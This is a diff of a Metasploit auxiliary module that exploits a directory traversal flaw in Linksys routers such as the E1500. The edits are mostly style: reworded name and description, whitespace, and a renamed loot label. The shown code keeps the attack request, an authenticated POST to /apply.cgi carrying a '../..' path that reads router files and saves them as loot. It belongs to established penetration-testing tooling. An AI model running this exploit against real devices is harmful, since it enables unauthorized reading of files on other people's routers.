@@ -14,18 +14,18 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'Linksys Directory Traversal Vulnerability',
+			'Name'        => 'Linksys E1500 Directory Traversal Vulnerability',
 			'Description' => %q{
-				This module exploits a directory traversal vulnerablity which is present in different
-				Linksys home routers like the E1500.
-				},
+					This module exploits a directory traversal vulnerability which is present in
+				different Linksys home routers, like the E1500.
+			},
 			'References'  =>
 				[
 					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ],
 					[ 'URL', 'http://homekb.cisco.com/Cisco2/ukp.aspx?pid=80&app=vw&vw=1&login=1&json=1&docid=d7d0a87be9864e20bc347a73f194411f_KB_EN_v1.xml' ],
 					[ 'BID', '57760' ],
 					[ 'OSVDB', '89911' ],
-					[ 'EDB', '24475' ],
+					[ 'EDB', '24475' ]
 				],
 			'Author'      => [ 'm-1-k-3' ],
 			'License'     => MSF_LICENSE
@@ -58,8 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 		uri = "/apply.cgi"
 		traversal = '../..'
 		data_trav = "submit_type=wsc_method2&change_action=gozila_cgi&next_page=" << traversal << file
-		res = send_request_cgi(
-			{
+		res = send_request_cgi({
 			'method'  => 'POST',
 			'uri'     => uri,
 			'authorization' => basic_auth(user,pass),
@@ -86,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
 					:method => "POST"
 			})
 
-			loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
+			loot = store_loot("linksys.traversal.data","text/plain", rhost, res.body, file)
 			vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 		elsif (res and res.code)
 			vprint_error("#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
@@ -105,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
 				'uri' => '/',
 				'method' => 'GET',
 				'authorization' => basic_auth(user,pass)
-				})
+			})
 
 			return if res.nil?
 			return if (res.headers['Server'].nil? or res.headers['Server'] !~ /httpd/)
@@ -124,7 +123,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		extract_words(datastore['SENSITIVE_FILES']).each do |file|
-			find_files(file,user,pass) unless file.empty?
+			find_files(file, user, pass) unless file.empty?
 		end
 	end
 end
